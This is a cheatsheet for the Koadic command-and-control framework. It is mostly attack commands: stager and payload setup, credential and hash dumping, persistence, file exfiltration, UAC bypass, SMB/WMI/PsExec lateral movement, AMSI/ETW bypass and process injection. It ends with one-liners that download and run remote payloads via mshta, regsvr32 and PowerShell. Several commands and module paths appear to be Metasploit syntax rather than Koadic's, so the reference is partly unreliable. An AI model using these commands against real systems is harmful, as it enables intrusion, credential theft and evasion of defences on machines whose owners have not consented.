# Koadic Cheatsheet

## Quick Reference

### Starting Koadic

```bash
# Start Koadic C2 server
koadic

# Start with autorun file
koadic --autorun /path/to/commands.txt

# Start with restore file
koadic --restore /path/to/restore.json
```

### Stager Selection

```bash
# List available stagers
use stager/js/mshta

# Common stagers:
use stager/js/mshta        # Uses mshta.exe
use stager/js/regsvr32     # Uses regsvr32.exe
use stager/js/winrm        # Uses WinRM
use stager/js/custom       # Custom stager
```

### Stager Configuration

```bash
# Configure MSHTA stager
use stager/js/mshta
set SRVHOST 0.0.0.0
set SRVPORT 9999
run

# Configure Regsvr32 stager
use stager/js/regsvr32
set SRVHOST 0.0.0.0
set SRVPORT 9999
run

# Configure WinRM stager
use stager/js/winrm
set SRVHOST 0.0.0.0
set SRVPORT 9999
run
```

### Payload Generation

```bash
# Generate MSHTA payload
use stager/js/mshta
set SRVHOST <your_ip>
set SRVPORT 9999
generate

# Output example:
# mshta.exe http://192.168.1.100:9999/payload.hta
```

### Session Management

```bash
# List sessions
sessions

# Interact with session
sessions -i <session_id>

# Kill session
sessions -k <session_id>

# Background session
background
```

### Post-Exploitation Modules

```bash
# System information
use post/recon/sysinfo
set SESSION <session_id>
run

# Credential dumping
use post/recon/credentials
set SESSION <session_id>
run

# Network scanning
use post/recon/network_scanner
set SESSION <session_id>
set RHOSTS 10.0.0.0/24
run

# Registry persistence
use post/persistence/registry
set SESSION <session_id>
run

# File download
use post/exfil/file_download
set SESSION <session_id>
set REMOTE_PATH C:\Users\target\file.txt
set LOCAL_PATH /loot/file.txt
run

# File upload
use post/exfil/file_upload
set SESSION <session_id>
set REMOTE_PATH C:\temp\payload.exe
set LOCAL_PATH /path/to/payload.exe
run
```

### Privilege Escalation

```bash
# UAC bypass
use post/privesc/bypassuac
set SESSION <session_id>
run

# Token impersonation
use post/recon/token_impersonation
set SESSION <session_id>
run
```

### Lateral Movement

```bash
# SMB execution
use post/lateral_movement/smb_exec
set SESSION <session_id>
set RHOSTS 10.0.0.51
set SMBUser admin
set SMBPass password123
run

# WMI execution
use post/lateral_movement/wmi_exec
set SESSION <session_id>
set RHOSTS 10.0.0.51
set WMIUser admin
set WMIPass password123
run

# PSExec execution
use post/lateral_movement/psexec
set SESSION <session_id>
set RHOSTS 10.0.0.51
set SMBUser admin
set SMBPass password123
run
```

### Custom JScript Modules

```javascript
// Example custom module
var oShell = new ActiveXObject("WScript.Shell");
var result = oShell.Exec("cmd.exe /c whoami").StdOut.ReadAll();
return result;
```

### Session Commands

```bash
# Once in a session:
sysinfo                    # System information
getuid                     # Current user
getprivs                   # Enabled privileges
hashdump                   # Dump password hashes
ps                         # List processes
migrate <pid>              # Migrate to another process
download <file>            # Download file from target
upload <file>              # Upload file to target
shell <command>            # Execute shell command
```

### Autorun File

```bash
# Example commands.txt:
use post/recon/sysinfo
run
use post/recon/credentials
run
use post/recon/network_scanner
set RHOSTS 10.0.0.0/24
run

# Start with autorun
koadic --autorun /path/to/commands.txt
```

### Restore File

```bash
# Save session state
save /path/to/restore.json

# Restore session
koadic --restore /path/to/restore.json
```

### OPSEC Tips

```bash
# Use in-memory execution
# Default behavior (no files written to disk)

# AMSI bypass
use post/bypass/amsi
set SESSION <session_id>
run

# ETW bypass
use post/bypass/etw
set SESSION <session_id>
run

# Process injection
use post/evasion/process_injection
set SESSION <session_id>
set TARGET_PID <pid>
run
```

### Troubleshooting

```bash
# Stager fails to execute
# Check: URL accessible, firewall rules, stager technology available

# Session drops immediately
# Check: network stability, AV/EDR detection, AMSI/ETW interference

# Modules fail to execute
# Check: session active, COM objects available, error messages

# Cannot connect to C2 server
# Check: server running, firewall rules, stager configuration
```

### Common Stager Commands

```bash
# MSHTA payload
mshta.exe http://<ip>:<port>/payload.hta

# Regsvr32 payload
regsvr32 /s /n /u /i:http://<ip>:<port>/payload.sct scrobj.dll

# PowerShell payload
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ip>:<port>/payload.ps1')"
```
